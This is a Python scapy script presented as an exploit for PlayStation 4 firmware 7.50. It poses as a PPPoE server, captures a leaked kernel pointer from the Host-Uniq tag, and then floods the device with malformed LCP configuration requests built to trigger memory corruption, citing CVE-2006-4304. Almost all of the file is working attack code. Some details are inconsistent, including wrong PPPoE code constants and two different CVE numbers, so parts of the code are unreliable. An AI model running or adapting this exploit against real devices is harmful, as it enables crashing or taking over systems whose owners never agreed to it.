from scapy.all import sniff, sendp, Ether, PPPoED, PPPoED_Tags, PPP_LCP_Configure
from socket import *
import time, struct

IFACE_NAME = "enp3s0"
PPPOE_CODE_RCR = 0x01
PPPOE_CODE_PADI = 0x09
PPPOE_CODE_PADO = 0x07
PPPOE_CODE_PADR = 0x19
PPPOE_CODE_PADS = 0x65
PPPOE_CODE_PADT = 0xa7
PPPOE_CODE_SESSION = 0x00
PPPOE_HOST_UNIQ = 259

CONF_REQ = 1
CONF_ACK = 2
CONF_NAK = 3
CONF_REJ = 4
ECHO_REQ = 9
ECHO_REPLY = 10

# Steps:
# 1. Listen to PADI (PPPoE Active Discovery Initiation) requests to DSL-AC and send a PADO (PPPoE Active Discovery Offer) response with the DSL-AC MAC address.
# 2. Listen to PADR (PPPoE Active Discovery Request) to confirm the acceeptance of the PADO packet and send a PADS (PPPoE Active Discovery Session-confirmation) and a Sesssion ID to confirm the connection.
# 3. Listen to RCR (Configuration Request) to negotiate PPP LCP (PPP Link Control Protocol)  

def send_packet(packet, interface = IFACE_NAME):
    sendp(packet, iface=interface)

src_mac = None
dst_mac = None
sessionid = None
host_uniq = None
found_packet = None

def send_pado(packet):
    global src_mac
    global dst_mac
    global sessionid
    global host_uniq
    global found_packet
    
    if(packet[PPPoED].code != PPPOE_CODE_PADI):
        print("Failed to sniff PADR..")
        found_packet = None
        return
    found_packet = packet
    
    # Get PS4 MAC address
    print(f"[+] Source MAC: {packet[Ether].dst}")
    print(f"[+] Destination MAC: {packet[Ether].src}")
    src_mac = bytes.fromhex(packet[Ether].dst.replace(":", ""))
    dst_mac = bytes.fromhex(packet[Ether].src.replace(":", ""))

    # Get Session ID value
    sessionid = int(packet[PPPoED].sessionid)
    print(f"[+] Session ID: {sessionid}")

    # Get Host-Uniq value
    for tag in packet[PPPoED][PPPoED_Tags].tag_list:
        if(tag.tag_type == PPPOE_HOST_UNIQ): # *if_softc pointer leak
            host_uniq = tag.tag_value
            print(f"[+] Host-Uniq (*if_softc leak): {hex(struct.unpack('<Q', host_uniq)[0])}")
    
    
    pado = bytes([
        *dst_mac,
        *src_mac,
        # Type: PPPoE Discovery (0x8863)
        0x88, 0x63,
        # Version: 1 Type: 1 (PPPoE Discovery)
        0x11,
        PPPOE_CODE_PADO,
        *sessionid.to_bytes(2, "big"),
        # Payload Length: 12
        0x00, 0x0c,
        # Payload Type (PPPoE Tag)
        # Host-Uniq
        0x01, 0x03,
        *len(host_uniq).to_bytes(2, "big"),
        *host_uniq

    ]) 

    print("[*] Sending PADO (PPPoE Active Discovery Offer)..")
    send_packet(pado)


def send_pads(packet):
    global src_mac
    global dst_mac
    global sessionid
    global host_uniq
    global found_packet
    
    if(packet[PPPoED].code != PPPOE_CODE_PADR):
        print("[-] Failed to sniff PADR..")
        found_packet = None
        return
    found_packet = packet
    
    sessionid += 1
    pads = bytes([
        *dst_mac,
        *src_mac,
        # Type: PPPoE Discovery (0x8863)
        0x88, 0x63,
        # Version: 1 Type: 1 (PPPoE Discovery)
        0x11,
        PPPOE_CODE_PADS,
        *sessionid.to_bytes(2, "big"),
        # Payload Length: 12
        0x00, 0x0c,
        # Payload Type (PPPoE Tag)
        # Host-Uniq
        0x01, 0x03,
        *len(host_uniq).to_bytes(2, 'big'),
        *host_uniq
    ])

    print("[*] Sending PADS (PPPoE Active Discovery Session-confirmation)..")
    send_packet(pads)

def send_lcp(packet):
    
    if(packet[PPP_LCP_Configure].code != PPPOE_CODE_RCR):
        print("Failed to sniff RCR..")
        found_packet = None
        return
    found_packet = packet

    print(f"[+] LCP ID: {packet[PPP_LCP_Configure].id}")
    for option in packet[PPP_LCP_Configure].options:
        if(option.type == 5):        
            print(f"[+] LCP Magic Number: {hex(option.magic_number)}")

    while(True):
        lcp = bytes([
            *dst_mac,
            *src_mac,
            # Type: PPPoE Session (0x8864)
            0x88, 0x64,
            # Version: 1 Type: 1 (PPPoE Discovery)
            0x11,
            PPPOE_CODE_SESSION,
            *sessionid.to_bytes(2, "big"),
            # Payload Length: 9
            0x00, 0x09,
            # Protocol: Link Control Protocol (0xc021)
            0xc0, 0x21,
            # Code: Configuration Request (RCR)
            PPPOE_CODE_RCR,
            # ID
            0x00, 
            # Length (malloc size: CVE-2006-4340)
            0x00, 0x77, 
            # Type: invalid
            0x40, 0xff
        ])
        lcp += (b"UnknownD4") * 110
        #time.sleep(0.25)
        send_packet(lcp)

def ppp_negotation():
    print("[*] Listening to PADI (PPPoE Active Discovery Initiation)..")
    sniff(prn=send_pado, iface=IFACE_NAME, filter="pppoed", stop_filter=lambda x: found_packet != None, count=5)

    print("[*] Listening to PADR (PPPoE Active Discovery Request)..")
    sniff(prn=send_pads, iface=IFACE_NAME, filter="pppoed", stop_filter=lambda x: found_packet != None, count=5)

def lcp_negotiation():
    print("[*] Listening to RCR (Configuration Request)..")
    sniff(prn=send_lcp, iface=IFACE_NAME, filter="pppoes", count=1)

def exploit():

    print("[*] Are you ready to exploit the PS4 FW 7.50?!")
    print("[*] #### CVE-2006-4304 ###")

    print("[*] STAGE 0: Initialization")
    ppp_negotation()
    lcp_negotiation()

    



if __name__ == '__main__':
    exploit()
